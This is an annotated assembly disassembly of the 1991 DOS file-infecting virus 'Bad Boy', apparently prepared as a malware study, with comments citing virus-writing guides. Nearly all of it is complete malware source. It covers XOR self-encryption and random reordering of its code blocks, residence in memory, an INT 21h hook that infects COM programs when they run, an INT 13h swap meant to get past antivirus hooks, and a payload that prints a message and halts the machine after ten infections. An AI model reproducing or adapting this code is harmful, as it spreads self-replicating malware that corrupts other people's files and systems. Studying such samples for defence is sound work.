; Disassembly of `Virus.DOS.BadBoy.1000.a`.
;
; Source: COM file (MD5: cc1584c8758dca16114fa7408895a0f9).
;
; Resources:
;
; - A Basic Virus Writing Primer (PSP): http://vxheaven.org/lib/static/vdat/tubasvir.htm
; - Dark Angel's Chewy Virus Writing Guide (MCB): http://vxheaven.org/lib/static/vdat/tuda0005.htm
; - SFT's and Their Usage: http://www.textfiles.com/virus/datut007.txt

                        org 100h

allocated_memory_segments: equ 0C0h
infection_max_file_size:   equ 0F000h
infections_number_trigger: equ 0Ah
bios_timer_addr:           equ 46Ch          ; BIOS timer ticks since midnight
block_copied_mask:         equ 8000h
blocks_number:             equ 8
com_file_entrypoint:       equ 100h
dos_330_offset_int21:      equ 1460h         ; DOS 3.30: offset of the INT 21h address

; it's not clear why the code uses some times this size, and sometimes (virus_size + 1) -
; the byte `unused_byte` is in fact unused.
; the size on disk is (virus_size + 1)
virus_size:                equ 3E8h

mcb_relative_position:         equ 0
mcb_available_memory_segments: equ 3
last_mcb_marker:               equ 5Ah

psp_top_of_current_program_segment: equ 2

sft_file_open_mode:      equ 2
sft_file_time:           equ 0Dh
sft_file_date:           equ 0Fh
sft_file_size_ofs:       equ 11h
sft_file_current_ofs:    equ 15h

; ---------------------------------------------------------------------------
; VIRUS
; ---------------------------------------------------------------------------

virus_begin:

; ---------------------------------------------------------------------------
; HEADER/VARIABLES
; ---------------------------------------------------------------------------

virus_header:
                        push    word [cs:addr_residence_check]
                        push    cs
                        pop     ds
                        jmp     word [cs:addr_decryption_routine]  ; jump_to_decryptor
end_of_virus_header:

; ---------------------------------------------------------------------------

current_writing_location:  dw 0              ; used on blocks mixing

infections_counter:  db 0

file_original_size:  dw 2
file_original_time:  dw 0
file_original_date:  dw 0

alternate_original_int21_address: dd 0       ; if not DOS 3.30, it's the same as original_int21_addr
int13_address:                    dd 0
original_int21_addr:              dd 0
original_int24_addr:              dd 0

block_addresses:
addr_decryption_routine:       dw jump_to_decryptor        ; not encrypted
addr_residence_check:          dw residence_check
addr_process_interrupts:       dw process_interrupts
addr_exit_memory_installation: dw exit_memory_installation
addr_payload:                  dw payload
addr_int24_handler:            dw int24_handler            ; not encrypted
addr_int21_handler:            dw int21_handler
addr_infect_file:              dw infect_file

block_lengths:          dw 25h, 0B4h, 68h, 3Dh, 35h, 2Ah, 87h, 13Fh

end_of_variables_section:

blocks_start:

; ---------------------------------------------------------------------------
; BLOCK 1: EN/DECRYPTION ROUTINE
; ---------------------------------------------------------------------------

; There are two encryptions (see `copy_head_section`).
; By storing the virus in memory with the same layout as COM files (that is, starting at 100h), the
; en/decryption will work (since it uses the offset itself as encryption key).

decryption_routine:
                        mov     bx, addr_residence_check ; start from this block
                        mov     cx, blocks_number - 2  ; excluding this ...

blocks_decryption_loop:
                        cmp     bx, addr_int24_handler ; ... and the int 24 handler
                        jnz     short prepare_decryption
                        add     bx, 2

prepare_decryption:
                        push    bx
                        push    cx
                        mov     ax, [bx]     ; low byte of the routine address is the encryption key (see below)
                        mov     cx, [bx + block_lengths - block_addresses]
                        mov     bx, ax       ; block address

addr_decryption_loop:
                        xor     [bx], al
decryption_function_modifier: equ $ - 1
                        inc     bx
                        loop    addr_decryption_loop

                        pop     cx           ; pop [addresses] count
                        pop     bx           ; pop address
                        add     bx, 2        ; next address!
                        loop    blocks_decryption_loop
                        retn

; ---------------------------------------------------------------------------
; BLOCK 2: RESIDENCE
; ---------------------------------------------------------------------------

residence_check:
                        mov     es, word [cs:psp_top_of_current_program_segment]
                        mov     di, virus_begin
                        mov     si, virus_begin
                        mov     cx, end_of_virus_header - virus_header - 1
                        repe cmpsb
                        jnz     short check_if_last_mcb
                        jmp     word [cs:addr_exit_memory_installation]

check_if_last_mcb:      mov     ax, cs
                        dec     ax
                        mov     ds, ax
                        cmp     byte [mcb_relative_position], last_mcb_marker
                        jz      short allocate_memory
                        jmp     word [cs:addr_exit_memory_installation]

allocate_memory:
                        sub     word [mcb_available_memory_segments], allocated_memory_segments
                        mov     ax, es
                        sub     ax, allocated_memory_segments
                        mov     es, ax
                        mov     [10h + psp_top_of_current_program_segment], ax ; ds = cs - 10h

                        push    cs
                        pop     ds
                        mov     byte [cs:infections_counter], 0

copy_head_section:
                        mov     di, virus_begin ; es = virus residence segment
                        mov     cx, end_of_variables_section - virus_header
                        mov     si, virus_begin ; ds = cs
                        rep movsb
                        mov     bx, [cs:block_addresses]
                        add     bx, decryption_function_modifier - decryption_routine
                        xor     byte [bx], 18h ; switch encryption (`xor [bx], bl`)
                        mov     cx, blocks_number
                        mov     word [current_writing_location], blocks_start

randomized_blocks_copy:
                        push    cx
                        call    choose_random_block ; bx -> block ptr address
                        push    bx
                        mov     ax, [bx]     ; ax = block address
                        push    ax
                        add     bx, block_lengths - block_addresses
                        mov     cx, [bx]     ; cx = block size
                        pop     si           ; ds = cs; si = block address
                        pop     bx           ; bx = block ptr address
                                             ; es = virus res. segment; di = currently writing address
                        xchg    di, word [current_writing_location]
                        mov     [es:bx], di  ; store the current writing location in the block ptr
                        rep movsb
                        xchg    di, word [current_writing_location]
                        mov     ax, block_copied_mask
                        or      [bx], ax     ; mark the block as copied (bx = block ptr address)
                        pop     cx
                        loop    randomized_blocks_copy

clear_blocks_copied_mask:
                        mov     cl, blocks_number
                        not     ax           ; ax = block_copied_mask
                        mov     bx, block_addresses
clear_block_copied_mask_loop:
                        and     [bx], ax     ; unmask list entry (ax = NOT(block_copied_mask))
                        add     bx, 2
                        loop    clear_block_copied_mask_loop
                        jmp     word [cs:addr_process_interrupts]

choose_random_block:
                        push    cx
                        push    es
                        xor     cx, cx
                        mov     es, cx

; note that the `and bx, 7` has been padded with a NOP because nasm doesn't support the original
; inefficient encoding.
random_loop:
                        mov     bx, [es:bios_timer_addr]
                        and     bx, 7
                        nop
                        shl     bx, 1
                        add     bx, block_addresses
                        test    word [bx], block_copied_mask
                        jnz     short random_loop
                        pop     es
                        pop     cx
                        retn

; ---------------------------------------------------------------------------
; BLOCK 3: PROCESS INTERRUPTS
; ---------------------------------------------------------------------------

process_interrupts:                          ; hijack int21 and store int13
                        xor ax,ax
                        mov ds,ax
                        mov ax,[21h * 4]
                        mov [es:original_int21_addr],ax
                        mov ax,[21h * 4 + 2]
                        mov [es:original_int21_addr + 2],ax

                        mov ah, 30h          ; get DOS version
                        int 21h
                        cmp ax, 1E03h        ; 3.30?
                        jnz short not_dos_330

                        mov word [es:alternate_original_int21_address], dos_330_offset_int21
                        mov ax, 1203h
                        push ds
                        int 2Fh              ; => Return: DS = segment of IBMDOS.COM/MSDOS.SYS
                        mov [es:alternate_original_int21_address + 2],ds
                        pop ds
                        jmp short hijack_int21

                        nop

not_dos_330:
                        mov ax,[21h * 4]
                        mov [es:alternate_original_int21_address],ax
                        mov ax,[21h * 4 + 2]
                        mov [es:alternate_original_int21_address + 2],ax

hijack_int21:
                        cli
                        mov ax,[es:addr_int21_handler]
                        mov [21h * 4],ax
                        mov ax,es
                        mov [21h * 4 + 2],ax
                        sti

find_int13_address:
                        mov cx,es
                        mov ah,13h           ; get disk interrupt handler
                        int 2Fh              ; DS:DX -> interrupt handler disk driver calls on read/write
                                             ; ES:BX = address to restore INT 13 to on system halt (exit from root shell) or warm boot (INT 19)
                                             ; return: DS:DX set by previous invocation of this function
                                             ;         ES:BX set by previous invocation of this function

                        push es
                        mov es,cx
                        mov [es:int13_address],dx
                        mov [es:int13_address + 2],ds
                        pop es
                        int 2Fh              ; restore the previous values

                        jmp word [cs:addr_exit_memory_installation]

; ---------------------------------------------------------------------------
; BLOCK 4: EXIT MEMORY INSTALLATION
; ---------------------------------------------------------------------------

exit_memory_installation:
                        push cs
                        push cs
                        pop ds
                        pop es
                        mov si, [cs:addr_exit_memory_installation]
                        add si, restore_host_header - exit_memory_installation
                        nop
                        mov di, [cs:file_original_size] ; tail address = original file header
                        add di, original_file_content_buffer
                        push di
                        mov cx, end_of_restore_host_header - restore_host_header
                        cld
                        rep movsb
                        ret

restore_host_header:
                        mov si, [cs:file_original_size]
                        add si, com_file_entrypoint
                        cmp si, com_file_entrypoint + virus_size + 1
                        jae short host_was_longer_than_virus_size

; host was smaller; then the buffer starts immediately after the virus end
                        mov si, com_file_entrypoint + virus_size + 1

host_was_longer_than_virus_size:
                        mov di, com_file_entrypoint
                        mov cx, virus_size
                        rep movsb
                        mov ax, com_file_entrypoint
                        push ax
                        ret
end_of_restore_host_header:

; ---------------------------------------------------------------------------
; BLOCK 5: PAYLOAD
; ---------------------------------------------------------------------------

payload:
                        mov     ah, 9
                        mov     dx, word [addr_payload]
                        add     dx, message - payload
                        nop
                        push    cs
                        pop     ds
                        int     21h          ; print string in DS:DX, terminated by "$"

                        cli
                        hlt

message:                db 0Dh, 0Ah, 'The bad boy halt your system ...', 7, 7, '$'

; ---------------------------------------------------------------------------
; BLOCK 6: INT 24 HANDLER
; ---------------------------------------------------------------------------

int24_handler:

                        mov al, 3
                        iret

; writer signature; encrypted in the block

                        db 'The Bad Boy virus, Copyright (C) 1991.', 0

; ---------------------------------------------------------------------------
; BLOCK 7: INT 21 HANDLER
; ---------------------------------------------------------------------------

int21_handler:
                        push    bx
                        push    si
                        push    di
                        push    es
                        push    ax
                        cmp     ax, 4B00h    ; execution?
                        jz      short save_int24_original_address
                        jmp     short execute_original_int21

                        nop

save_int24_original_address:
                        push    ds
                        push    cs
                        pop     es
                        xor     ax, ax
                        mov     ds, ax
                        mov     si, 24h * 4
                        mov     di, original_int24_addr
                        movsw
                        movsw

disable_int24:
                        mov     ax, word [cs:addr_int24_handler]
                        cli
                        mov     [24h * 4], ax
                        mov     ax, cs
                        mov     [24h * 4 + 2], ax
                        sti

                        pop     ds
                        mov     ax, 3D00h    ; open file for reading (mode changed to r/w via SFT at line 451)
                        pushf
                        call    word far [cs:original_int21_addr]
                        jb      short restore_original_int_24
                        mov     bx, ax       ; file handler
                        call    word [cs:addr_infect_file]
                        pushf
                        mov     ah, 3Eh      ; close file
                        pushf
                        call    word far [cs:original_int21_addr]
                        popf
                        jb      short restore_original_int_24
                        push    ds
                        cli

; int 13 was replaced in infect_file
restore_int13:
                        xor     ax, ax
                        mov     ds, ax
                        mov     ax, word [cs:int13_address]
                        xchg    ax, [13h * 4]
                        mov     word [cs:int13_address], ax
                        mov     ax, word [cs:int13_address + 2]
                        xchg    ax, [13h * 4 + 2]
                        mov     word [cs:int13_address + 2], ax
                        sti
                        pop     ds

restore_original_int_24:
                        push    ds
                        xor     ax, ax
                        mov     ds, ax
                        mov     ax, word [cs:original_int24_addr]
                        mov     [24h * 4], ax
                        mov     ax, word [cs:original_int24_addr + 2]
                        mov     [24h * 4 + 2], ax
                        pop     ds

execute_original_int21:
                        pop     ax
                        pop     es
                        pop     di
                        pop     si
                        pop     bx
                        jmp     word far [cs:original_int21_addr]

; ---------------------------------------------------------------------------
; BLOCK 8: INFECTION
; ---------------------------------------------------------------------------

infect_file:
                        push    cx
                        push    dx
                        push    ds
                        push    es
                        push    di
                        push    bp
                        push    bx
                        mov     ax, 1220h       ; Get Job File Table entry for file handle
                        int     2Fh             ; Return: ES:DI -> JFT entry

                        mov     bl, [es:di]
                        xor     bh, bh
                        mov     ax, 1216h       ; Get System File Table entry; BX = SFT entry number from JFT
                        int     2Fh             ; Return: ES:DI -> SFT entry

                        pop     bx
                        mov     ax, [es:di + sft_file_size_ofs]
                        cmp     ax, infection_max_file_size
                        jb      short store_file_attributes
                        jmp     exit_infection

store_file_attributes:
                        mov     word [es:di + sft_file_open_mode], 2 ; set file open mode to read/write
                        mov     ax, [es:di + sft_file_size_ofs]
                        mov     word [cs:file_original_size], ax
                        mov     ax, [es:di+sft_file_time]
                        mov     word [cs:file_original_time], ax
                        mov     ax, [es:di+sft_file_date]
                        mov     word [cs:file_original_date], ax

                        push    cs
                        pop     ds
                        mov     dx, original_file_content_buffer
                        mov     cx, virus_size
                        mov     ah, 3Fh      ; read file
                        pushf
                        call    word far [cs:original_int21_addr]
                        jnb     short check_if_exe_file
                        jmp     exit_infection

check_if_exe_file:
                        mov     bp, ax       ; AX = header files read (<= virus_size)
                        mov     si, dx       ; DX = file displacement buffer
                        mov     ax, 'ZM'     ; EXE?
                        cmp     ax, [si]
                        jnz     short check_if_exe_file_2
                        jmp     exit_infection

check_if_exe_file_2:
                        xchg    ah, al       ; EXE (other magic number)?
                        cmp     ax, [si]
                        jnz     short check_if_file_is_infected
                        jmp     exit_infection

check_if_file_is_infected:
                        push    es
                        push    di
                        push    cs
                        pop     es
                        mov     si, virus_header
                        mov     di, dx
                        mov     cx, end_of_virus_header - virus_header - 1
                        repe cmpsb
                        pop     di
                        pop     es
                        jnz     short file_is_not_infected
                        jmp     exit_infection

file_is_not_infected:
                        mov     word [es:di + sft_file_current_ofs], 0
                        push    es
                        push    di
                        mov     si, word [cs:addr_infect_file]
                        add     si, write_virus - infect_file
                        xor     di, di
                        push    cs
                        pop     es
                        mov     cx, end_of_write_virus - write_virus
                        cld
                        rep movsb
                        pop     di
                        pop     es
                        mov     si, word [cs:addr_infect_file]
                        add     si, infection_closure - infect_file
                        push    si
                        xor     si, si
                        push    si
                        push    ds

; replace the int13 address with the original int13 value; if any AV hooked it, it will be
; bypassed.
;
replace_int13:
                        cli
                        xor     ax, ax
                        mov     ds, ax
                        mov     ax, word [cs:int13_address]
                        xchg    ax, [13h * 4]
                        mov     word [cs:int13_address], ax
                        mov     ax, word [cs:int13_address + 2]
                        xchg    ax, [13h * 4 + 2]
                        mov     word [cs:int13_address + 2], ax

                        sti
                        pop     ds           ; return to write_virus
                        retn

write_virus:
                        push    bx
                        call    [cs:addr_decryption_routine] ; encrypt virus
                        pop     bx
                        mov     dx, virus_begin
                        mov     ah, 40h      ; write to file
                        mov     cx, virus_size + 1
                        pushf
                        call    word far [cs:alternate_original_int21_address]
                        pushf
                        push    bx
                        call    [cs:addr_decryption_routine] ; decrypt virus
                        pop     bx
                        popf
                        jnc     short infection_successful

                        pop     ax
                        mov     ax, word [cs:addr_infect_file]
                        add     ax, exit_infection_2 - infect_file
                        push    ax
                        retn

infection_successful:
                        mov     ax, [es:di + sft_file_size_ofs]
                        mov     [es:di + sft_file_current_ofs], ax
                        mov     dx, original_file_content_buffer
                        mov     cx, bp       ; header files read (<= virus_size)
                        mov     ah, 40h      ; write to file
                        pushf
                        call    word far [cs:alternate_original_int21_address]
                        retn
end_of_write_virus:

infection_closure:
                        mov     ax, 5701h    ; write timestamp
                        mov     cx, word [cs:file_original_time]
                        mov     dx, word [cs:file_original_date]
                        pushf
                        call    word far [cs:original_int21_addr]
                        inc     byte [cs:infections_counter]
                        cmp     byte [cs:infections_counter], infections_number_trigger
                        jnz     short exit_infection_2
                        call    word [cs:addr_payload]
                        jmp     short exit_infection_2

exit_infection:
                        stc
                        jmp     short exit_infection_3

exit_infection_2:
                        clc

exit_infection_3:
                        pop     bp
                        pop     di
                        pop     es
                        pop     ds
                        pop     dx
                        pop     cx
                        retn

unused_byte             db 0                 ; not clear what's the role of this

; ---------------------------------------------------------------------------

original_file_content_buffer:
                        int     20h

jump_to_decryptor:
                        mov     word [cs:addr_decryption_routine], decryption_routine
                        retn

; buffer ends at original_file_content_buffer + virus_size
